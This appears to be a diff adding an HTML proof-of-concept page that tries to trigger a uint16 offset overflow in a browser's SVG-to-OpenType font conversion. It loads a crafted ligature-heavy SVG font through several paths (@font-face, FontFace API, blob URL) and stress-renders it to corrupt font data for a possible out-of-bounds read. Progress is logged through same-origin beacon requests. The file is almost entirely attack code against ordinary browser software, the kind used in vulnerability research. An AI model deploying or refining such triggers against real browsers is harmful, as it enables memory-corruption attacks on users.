@@ -1,0 +1,139 @@
+<!doctype html><html><head><meta charset="utf-8"><title>p173b</title>
+<style>
+@font-face {
+  font-family: "BugFont";
+  src: url("bugfont.svg#BF") format("svg");
+}
+</style>
+</head><body>
+<script>
+// p173b — SVG font uint16 overflow via HTTP-served SVG font
+// SVGToOTFFontConversion.cpp:118 ASSERT(delta < uint16_t::max()) stripped in release
+// bugfont.svg: 256 base glyphs + 12000 ligature glyphs
+// 12000 ligatures * ~8 bytes = ~96KB GSUB data → overflows uint16 offsets
+// Corrupted OTF → FreeType reads wrong data → potential OOB
+// Beacon prefix: V173B-
+
+(function() {
+  function B(tag) {
+    try { new Image().src = '/BEACON?V173B-' + tag + '&t=' + Date.now(); } catch(e) {}
+  }
+
+  B('BOOT');
+
+  // Also try FontFace API with explicit URL
+  var fontOk = false;
+  try {
+    var ff = new FontFace('BugFont2', 'url("bugfont.svg#BF")');
+    ff.load().then(function(loaded) {
+      document.fonts.add(loaded);
+      B('FF-API-OK');
+      fontOk = true;
+    }).catch(function(e) {
+      B('FF-API-ERR-' + String(e).substring(0, 40));
+    });
+  } catch(e) {
+    B('FF-API-CATCH-' + String(e).substring(0, 40));
+  }
+
+  // Create test element that forces font load + render
+  var testDiv = document.createElement('div');
+  testDiv.style.fontFamily = '"BugFont", sans-serif';
+  testDiv.style.fontSize = '48px';
+
+  // Build test string with ligature-triggering codepoint pairs
+  var testText = '';
+  for (var i = 0; i < 100; i++) {
+    testText += String.fromCharCode(0x100 + (i % 256));
+    testText += String.fromCharCode(0x100 + ((i + 1) % 256));
+    testText += ' ';
+  }
+  testDiv.textContent = testText;
+  document.body.appendChild(testDiv);
+  B('RENDER');
+
+  // Force layout
+  void testDiv.offsetWidth;
+  B('LAYOUT');
+
+  // Check at 1s intervals
+  function check(n) {
+    var loaded = false;
+    try { loaded = document.fonts.check('48px BugFont'); } catch(e) {}
+    B('CHK-' + n + '-L' + loaded);
+
+    var w = testDiv.offsetWidth;
+    B('CHK-' + n + '-W' + w);
+
+    if (loaded) {
+      B('FONT-OK');
+      stress();
+    } else if (n < 10) {
+      setTimeout(function() { check(n + 1); }, 1000);
+    } else {
+      B('FONT-TIMEOUT');
+      // Try blob fallback
+      tryBlobApproach();
+    }
+  }
+
+  function stress() {
+    // If font loaded, stress-test rendering with many ligature pairs
+    for (var sz = 12; sz <= 72; sz += 6) {
+      var d = document.createElement('div');
+      d.style.fontFamily = '"BugFont", "BugFont2", sans-serif';
+      d.style.fontSize = sz + 'px';
+      d.textContent = testText;
+      document.body.appendChild(d);
+      void d.offsetWidth;
+    }
+    B('STRESS-OK');
+
+    // Check for crashes / side effects
+    setTimeout(function() {
+      try {
+        var canary = document.createElement('div');
+        canary.textContent = 'canary';
+        document.body.appendChild(canary);
+        B('ALIVE-' + canary.offsetWidth);
+      } catch(e) {
+        B('ERR-' + String(e).substring(0, 30));
+      }
+      B('DONE');
+    }, 3000);
+  }
+
+  function tryBlobApproach() {
+    B('BLOB-FALLBACK');
+    // Fetch the SVG font and create blob URL
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', 'bugfont.svg', true);
+    xhr.responseType = 'blob';
+    xhr.onload = function() {
+      if (xhr.status !== 200) { B('FETCH-ERR-' + xhr.status); return; }
+      var blobUrl = URL.createObjectURL(xhr.response);
+      B('BLOB-URL-OK');
+
+      var style = document.createElement('style');
+      style.textContent = '@font-face { font-family: "BugFont3"; src: url("' + blobUrl + '#BF") format("svg"); }';
+      document.head.appendChild(style);
+
+      testDiv.style.fontFamily = '"BugFont3", sans-serif';
+      void testDiv.offsetWidth;
+
+      setTimeout(function() {
+        var loaded3 = false;
+        try { loaded3 = document.fonts.check('48px BugFont3'); } catch(e) {}
+        B('BLOB-LOADED-' + loaded3);
+        if (loaded3) stress();
+        else B('BLOB-FAIL');
+      }, 3000);
+    };
+    xhr.onerror = function() { B('FETCH-FAIL'); };
+    xhr.send();
+  }
+
+  setTimeout(function() { check(1); }, 1000);
+})();
+</script>
+</body></html>
